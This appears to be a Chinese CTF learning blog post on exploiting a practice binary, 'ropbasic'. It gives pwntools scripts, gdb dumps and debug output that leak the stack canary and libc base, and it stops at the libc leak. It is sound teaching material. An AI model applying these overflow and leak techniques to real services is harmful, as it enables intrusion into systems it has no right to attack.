@@ -1,0 +1,532 @@
+<!doctype html><html lang=zh-CN dir=ltr><head><meta charset=utf-8><meta name=viewport content='width=device-width,initial-scale=1'><meta name=description content="一些学到的 ROP 与 FSB 的题目总结"><title>Pwn01 ROP and FSB</title>
+<link rel=canonical href=https://nepl1t.github.io/p/pwn01-rop-and-fsb/><link rel=stylesheet href=/scss/style.min.0304c6baf04e01a8fe70693791cb744d56a3578a3120a8796cefc66825aa39c7.css><meta property='og:title' content="Pwn01 ROP and FSB"><meta property='og:description' content="一些学到的 ROP 与 FSB 的题目总结"><meta property='og:url' content='https://nepl1t.github.io/p/pwn01-rop-and-fsb/'><meta property='og:site_name' content='灯盐的缝纫工厂'><meta property='og:type' content='article'><meta property='article:section' content='Post'><meta property='article:tag' content='Stack Overflow'><meta property='article:tag' content='FSB'><meta property='article:published_time' content='2024-07-21T01:09:28+08:00'><meta property='article:modified_time' content='2024-07-21T01:09:28+08:00'><meta name=twitter:title content="Pwn01 ROP and FSB"><meta name=twitter:description content="一些学到的 ROP 与 FSB 的题目总结"><link rel="shortcut icon" href=/favicon.png></head><body class=article-page><script>(function(){const e="StackColorScheme";localStorage.getItem(e)||localStorage.setItem(e,"auto")})()</script><script>(function(){const t="StackColorScheme",e=localStorage.getItem(t),n=window.matchMedia("(prefers-color-scheme: dark)").matches===!0;e=="dark"||e==="auto"&&n?document.documentElement.dataset.scheme="dark":document.documentElement.dataset.scheme="light"})()</script><div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky"><button class="hamburger hamburger--spin" type=button id=toggle-menu aria-label=切换菜单>
+<span class=hamburger-box><span class=hamburger-inner></span></span></button><header><figure class=site-avatar><a href=/><img src="https://q1.qlogo.cn/g?b=qq&amp;nk=1369938134&amp;s=5" width=300 height=300 class=site-logo loading=lazy alt=Avatar>
+</a><span class=emoji>🍥</span></figure><div class=site-meta><h1 class=site-name><a href=/>灯盐的缝纫工厂</a></h1><h2 class=site-description>人人都会敬畏射手，可直面枪膛方得永生</h2></div></header><ol class=menu-social><li><a href=https://space.bilibili.com/3546607700150839 target=_blank title=Bilibili rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-bilibili"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 10a4 4 0 014-4h10a4 4 0 014 4v6a4 4 0 01-4 4H7a4 4 0 01-4-4v-6z"/><path d="M8 3l2 3"/><path d="M16 3l-2 3"/><path d="M9 13v-2"/><path d="M15 11v2"/></svg></a></li><li><a href=https://github.com/nepl1t target=_blank title=GitHub rel=me><svg class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 19c-4.3 1.4-4.3-2.5-6-3m12 5v-3.5c0-1 .1-1.4-.5-2 2.8-.3 5.5-1.4 5.5-6a4.6 4.6.0 00-1.3-3.2 4.2 4.2.0 00-.1-3.2s-1.1-.3-3.5 1.3a12.3 12.3.0 00-6.2.0C6.5 2.8 5.4 3.1 5.4 3.1a4.2 4.2.0 00-.1 3.2A4.6 4.6.0 004 9.5c0 4.6 2.7 5.7 5.5 6-.6.6-.6 1.2-.5 2V21"/></svg></a></li><li><a href=https://steamcommunity.com/id/_DYanLiAst/ target=_blank title=Steam rel=me><svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-tabler icons-tabler-outline icon-tabler-brand-steam"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M16.5 5a4.5 4.5.0 11-.653 8.953L11.5 16.962V17a3 3 0 01-2.824 3H8.5a3 3 0 01-2.94-2.402L3 16.5V13l3.51 1.755a2.989 2.989.0 012.834-.635l2.727-3.818A4.5 4.5.0 0116.5 5z"/><circle cx="16.5" cy="9.5" r="1" fill="currentcolor"/></svg></a></li></ol><ol class=menu id=main-menu><li><a href=/><svg class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><polyline points="5 12 3 12 12 3 21 12 19 12"/><path d="M5 12v7a2 2 0 002 2h10a2 2 0 002-2v-7"/><path d="M9 21v-6a2 2 0 012-2h2a2 2 0 012 2v6"/></svg>
+<span>Home</span></a></li><li><a href=/archives/><svg class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><rect x="3" y="4" width="18" height="4" rx="2"/><path d="M5 8v10a2 2 0 002 2h10a2 2 0 002-2V8"/><line x1="10" y1="12" x2="14" y2="12"/></svg>
+<span>Archives</span></a></li><li><a href=/search/><svg class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="10" cy="10" r="7"/><line x1="21" y1="21" x2="15" y2="15"/></svg>
+<span>Search</span></a></li><li><a href=/links/><svg class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M10 14a3.5 3.5.0 005 0l4-4a3.5 3.5.0 00-5-5l-.5.5"/><path d="M14 10a3.5 3.5.0 00-5 0l-4 4a3.5 3.5.0 005 5l.5-.5"/></svg>
+<span>Links</span></a></li><li class=menu-bottom-section><ol class=menu><li id=dark-mode-toggle><svg class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="8" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<svg class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="16" cy="12" r="2"/><rect x="2" y="6" width="20" height="12" rx="6"/></svg>
+<span>暗色模式</span></li></ol></li></ol></aside><aside class="sidebar right-sidebar sticky"><section class="widget archives"><div class=widget-icon><svg class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg></div><h2 class="widget-title section-title">目录</h2><div class=widget--toc><nav id=TableOfContents><ol><li><a href=#task1-ropbasic>Task1 ropbasic</a><ol><li><a href=#preparation>Preparation</a></li><li><a href=#leaking-canary>Leaking Canary</a></li><li><a href=#leaking-libc-addr>Leaking libc addr</a></li><li><a href=#getting-system-shell>Getting system shell</a></li><li><a href=#approach-2-orw>Approach 2 ORW</a></li></ol></li><li><a href=#task2-onerop>Task2 onerop</a><ol><li><a href=#preparation--leaking-libc-addr>Preparation & Leaking libc addr</a></li><li><a href=#getting-system-shell-1>Getting system shell</a></li></ol></li><li><a href=#task3-onefsb>Task3 onefsb</a><ol><li><a href=#preparation-1>Preparation</a></li><li><a href=#getting-offsets>Getting offsets</a></li><li><a href=#hijacking-control-flow>Hijacking control flow</a></li><li><a href=#leaking-libc-address>Leaking libc address</a></li><li><a href=#getting-system-shell-2>Getting system shell</a></li></ol></li><li><a href=#task4-fsb-stack>Task4 fsb-stack</a><ol><li><a href=#preparation-2>Preparation</a></li><li><a href=#leaking-libc-address-1>Leaking libc address</a></li><li><a href=#leaking-stack-address>Leaking stack address</a></li><li><a href=#hijacking-printf-return-addr--getting-system-shell>Hijacking printf() return addr & getting system shell</a></li></ol></li></ol></nav></div></section></aside><main class="main full-width"><article class=main-article><header class=article-header><div class=article-details><header class=article-category><a href=/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/>学习笔记
+</a><a href=/categories/cs/>CS
+</a><a href=/categories/ctf/>CTF</a></header><div class=article-title-wrapper><h2 class=article-title><a href=/p/pwn01-rop-and-fsb/>Pwn01 ROP and FSB</a></h2><h3 class=article-subtitle>一些学到的 ROP 与 FSB 的题目总结</h3></div><footer class=article-time><div><svg class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><path d="M11.795 21H5a2 2 0 01-2-2V7a2 2 0 012-2h12a2 2 0 012 2v4"/><circle cx="18" cy="18" r="4"/><path d="M15 3v4"/><path d="M7 3v4"/><path d="M3 11h16"/><path d="M18 16.496V18l1 1"/></svg>
+<time class=article-time--published>Jul 21, 2024</time></div><div><svg class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><polyline points="12 7 12 12 15 15"/></svg>
+<time class=article-time--reading>阅读时长: 11 分钟</time></div></footer></div></header><section class=article-content><blockquote><p><strong>Attention!</strong></p><p>该界面内提到的任何代码与原程序都可在 <a class=link href=https://github.com/nepl1t/nepl1t.github.io/tree/master/assets target=_blank rel=noopener>https://github.com/nepl1t/nepl1t.github.io/tree/master/assets</a> 内找到</p></blockquote><h2 id=task1-ropbasic>Task1 ropbasic</h2><h3 id=preparation>Preparation</h3><p>首先 <code>checksec</code> 一下程序，保护全开。 ROPgadget 只能找到一个 gadget：</p><pre><font color=#5FD700>❯</font> <font color=#26A269>ROPgadget</font> --binary <u style=text-decoration-style:solid>./ropbasic</u> --only <font color=#A2734C>&quot;pop|ret&quot;</font>
+Gadgets information
+============================================================
+0x00000000000011d3 : pop rbp ; ret
+0x000000000000101a : ret
+Unique gadgets found: 2
+</pre><p>嗯，至少找到一个 rbp_ret_addr 是 <code>0x00000000000011d3 </code>了。</p><p>反编译一下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>i</span><span class=p>;</span> <span class=c1>// [rsp+Ch] [rbp-114h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>264</span><span class=p>];</span> <span class=c1>// [rsp+10h] [rbp-110h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v6</span><span class=p>;</span> <span class=c1>// [rsp+118h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v6</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>for</span> <span class=p>(</span> <span class=n>i</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span> <span class=n>i</span> <span class=o>&lt;=</span> <span class=mi>3</span><span class=p>;</span> <span class=o>++</span><span class=n>i</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl>  <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;input&gt; &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>s</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nf>puts</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=p>}</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>main()</code> 的逻辑十分简单，每次将 <code>s</code> 开始的连续 <code>0x100</code> 个内存清零，然后输出，<code>read()</code> 0x1000个字节。肯定有栈溢出。</p><p><code>s</code> 相对 rbp 的偏移地址为 <code>0x110</code>，考虑到程序开了 Canary，因此当务之急就是将其泄漏出来，否则栈溢出泄漏 libc 就无从说起。</p><h3 id=leaking-canary>Leaking Canary</h3><p>根据代码知道，使用 gdb 停到 call memset 时：</p><pre>
+0x555555555264    <font color=#AFD700>lea</font><font color=#FFFFFF>    </font><font color=#5FD7FF>rax</font><font color=#FFFFFF>, [</font><font color=#5FD7FF>rbp</font><font color=#FFFFFF> - </font><font color=#AF87FF>0x110</font><font color=#FFFFFF>]</font>             <font color=#C01C28><b>RAX</b></font> =&gt; <font color=#A2734C>0x7fffffffd9f0</font> ◂— 0
+0x55555555526b    <font color=#AFD700>mov</font><font color=#FFFFFF>    </font><font color=#5FD7FF>edx</font><font color=#FFFFFF>, </font><font color=#AF87FF>0x100</font>                     <font color=#C01C28><b>EDX</b></font> =&gt; 0x100
+0x555555555270    <font color=#AFD700>mov</font><font color=#FFFFFF>    </font><font color=#5FD7FF>esi</font><font color=#FFFFFF>, </font><font color=#AF87FF>0</font>                         <b>ESI</b> =&gt; 0
+0x555555555275    <font color=#AFD700>mov</font><font color=#FFFFFF>    </font><font color=#5FD7FF>rdi</font><font color=#FFFFFF>, </font><font color=#5FD7FF>rax</font>                       <font color=#C01C28><b>RDI</b></font> =&gt; <font color=#A2734C>0x7fffffffd9f0</font> ◂— 0
+►<font color=#26A269><b>0x555555555278</b></font>    <font color=#AFD700><b>call</b></font><font color=#FFFFFF>   </font><font color=#C01C28>memset@plt</font>                  &lt;<font color=#C01C28>memset@plt</font>&gt;
+        <b>s</b>: <font color=#A2734C>0x7fffffffd9f0</font> ◂— 0
+        <b>c</b>: 0
+        <b>n</b>: 0x100
+</pre><p>然后查询 rdi 与 rsp 的值：</p><pre><font color=#C01C28>*</font><font color=#C01C28><b>RDI </b></font> <font color=#A2734C>0x7fffffffd9f0</font> ◂— 0
+<b>RSP </b> <font color=#A2734C>0x7fffffffd9e0</font> ◂— 0
+</pre><p>那么， 从 rdi （0x7fffffffd9f0）开始依次读取内存数据到 rsp （0x7fffffffdb00）的位置：</p><pre><font color=#C01C28><b>pwndbg&gt; </b></font>x /40gx 0x7fffffffd9f0
+<font color=#12488B>0x7fffffffd9f0</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda00</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda10</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda20</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda30</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda40</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda50</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda60</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda70</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda80</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffda90</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdaa0</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdab0</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdac0</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdad0</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdae0</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdaf0</font>:	0x0000000000000000	0xe719bae42bbeac00
+<font color=#12488B>0x7fffffffdb00</font>:	0x0000000000000001	0x00007ffff7c29d90
+<font color=#12488B>0x7fffffffdb10</font>:	0x0000000000000000	0x0000555555555230
+<font color=#12488B>0x7fffffffdb20</font>:	0x0000000100000000	0x00007fffffffdc18
+<font color=#C01C28><b>pwndbg&gt; </b></font></pre><p>考虑到 <code>memset()</code> 函数在这里只清空了 0x100 的数据 （一直到 <code>0x7fffffffdaf0: 0x0000000000000000</code> ） ，而 <code>0x7fffffffdaf8: 0xe719bae42bbeac00</code> ，这是一个 0x00 作结尾的数据，可以推测这就是 Canary，关于 <code>s</code> 的偏移值为 0x108。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span> <span class=c1>#0x7 bytes: b&#39;input&gt; &#39;</span>
+</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>offset</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;B&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x108</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>Canary</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x8</span><span class=p>))</span> <span class=o>-</span> <span class=mh>0x42</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x9</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;Canary:&#34;</span><span class=o>+</span><span class=nb>hex</span><span class=p>(</span><span class=n>Canary</span><span class=p>))</span> 
+</span></span></code></pre></td></tr></table></div></div><p>运行效果如下：</p><pre>[<font color=#C01C28><b>DEBUG</b></font>] Received 0x7 bytes:
+    b&apos;input&gt; &apos;
+[<font color=#C01C28><b>DEBUG</b></font>] Sent 0x109 bytes:
+    b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB&apos;
+[<font color=#C01C28><b>DEBUG</b></font>] Received 0x119 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA<font color=#12488B>│</font>AAAA<font color=#12488B>│</font>AAAA<font color=#12488B>│</font>AAAA│
+    *
+    00000100  41 41 41 41  41 41 41 41  42 <font color=#12488B>9f</font> 7e 4b  <font color=#12488B>15</font> <font color=#12488B>b6</font> 3e <font color=#12488B>f9</font>  │AAAA<font color=#12488B>│</font>AAAA<font color=#12488B>│</font>B<font color=#12488B>·</font>~K<font color=#12488B>│··</font>&gt;<font color=#12488B>·</font>│
+    00000110  <font color=#12488B>01</font> <font color=#C01C28>0a</font> 69 6e  70 75 74 3e  20                        │<font color=#12488B>·</font><font color=#C01C28>·</font>in<font color=#12488B>│</font>put&gt;<font color=#12488B>│</font> │
+    00000119
+[<font color=#12488B><b>*</b></font>] Canary:0xf93eb6154b7e9f00
+</pre><p>得到 Canary 为 <code>0xf93eb6154b7e9f00</code></p><p>程序没有检测到栈溢出，而是正常退出，这说明 Canary 成功泄漏并绕过了。</p><h3 id=leaking-libc-addr>Leaking libc addr</h3><p>由于开了 PIE，每次运行的基址都不一样，所以每次栈溢出 ROP 之前，都需要得到 libc 的地址。通过 <code>objdump -d</code> 可以发现程序里确实是有 <code>libc_start_main()</code> 的符号，我们可以找到它的地址，再减去其在 libc 中的偏移地址，从而得到 libc 地址。</p><p>首先，动态调试时（此时正在 <code>read()</code> 函数内）看到如下信息：</p><pre><font color=#12488B>─────────────────────────[ BACKTRACE ]──────────────────────────</font>
+ ► 0   0x55555555526b
+   1   0x7ffff7c29d90
+   2   0x7ffff7c29e40 __libc_start_main+128
+   3   0x555555555125
+</pre><p>因此可以判定， <code>0x55555555526b</code> （作为 <code>read()</code> 函数的返回地址）位于 <code>main()</code> 内，因此 <code>0x7ffff7c29d90</code> 就是 <code>main()</code> 函数执行完后的返回地址。</p><p>注意到 <code>0x7ffff7c29e40</code> （ 相对 <code>0x7ffff7c29d90</code> 是 <code>0xb0</code>）相对于 <code>__libc_start_main()</code> 的偏移值是 <code>0x80</code> (128) ，因此可以得到 <code>main()</code> 的返回地址相对于 <code>__libc_start_main()</code> 的偏移值是 <code>0x30</code> 。通过前面栈溢出得到 <code>main()</code> 的返回地址后，我们就可以得到<code>__libc_start_main()</code> 的实际地址。</p><p>通过如下的 python 脚本，可以得到 libc 的地址：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Leaking libc address</span>
+</span></span><span class=line><span class=cl><span class=n>__libc_start_main_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;__libc_start_main&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1># pause()</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>offset</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;AABBCCDDEEFFGGHH&#39;</span><span class=p>)</span> <span class=c1>#0x108 + 0x8 + 0x8 = 0x118</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x118</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>received</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=c1>#后面一个 &#39;\ninput&gt; &#39; (printf的内容)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x7</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>received</span> <span class=o>=</span> <span class=n>received</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>received</span> <span class=o>=</span> <span class=n>received</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>received</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># pause()</span>
+</span></span><span class=line><span class=cl><span class=n>main_return_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>received</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;waitwhat? &#34;</span> <span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>main_return_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>__libc_start_main_addr</span> <span class=o>=</span> <span class=n>main_return_addr</span> <span class=o>+</span> <span class=mh>0x30</span> 
+</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>__libc_start_main_addr</span> <span class=o>-</span> <span class=n>__libc_start_main_offset</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;main_return_addr:      </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>main_return_addr</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;__libc_start_main_addr:</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>__libc_start_main_addr</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc_addr:             </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span> 
+</span></span></code></pre></td></tr></table></div></div><p>运行效果如下：</p><pre>[<font color=#C01C28><b>DEBUG</b></font>] Sent 0x118 bytes:
+    b&apos;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBCCDDEEFFGGHH&apos;
+[<font color=#C01C28><b>DEBUG</b></font>] Received 0x126 bytes:
+    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA<font color=#12488B>│</font>AAAA<font color=#12488B>│</font>AAAA<font color=#12488B>│</font>AAAA│
+    *
+    00000100  41 41 41 41  41 41 41 41  41 41 42 42  43 43 44 44  │AAAA<font color=#12488B>│</font>AAAA<font color=#12488B>│</font>AABB<font color=#12488B>│</font>CCDD│
+    00000110  45 45 46 46  47 47 48 48  <font color=#12488B>90</font> <font color=#12488B>9d</font> <font color=#12488B>c2</font> 42  38 77 <font color=#C01C28>0a</font> 69  │EEFF<font color=#12488B>│</font>GGHH<font color=#12488B>│···</font>B<font color=#12488B>│</font>8w<font color=#C01C28>·</font>i│
+    00000120  6e 70 75 74  3e 20                                  │nput<font color=#12488B>│</font>&gt; │
+    00000126
+b&apos;\x90\x9d\xc2B8w\x00\x00&apos;
+[<font color=#12488B><b>*</b></font>] waitwhat? 0x773842c29d90
+[<font color=#12488B><b>*</b></font>] main_return_addr:      0000773842C29D90
+[<font color=#12488B><b>*</b></font>] __libc_start_main_addr:0000773842C29DC0
+[<font color=#12488B><b>*</b></font>] libc_addr:             0000773842C00000
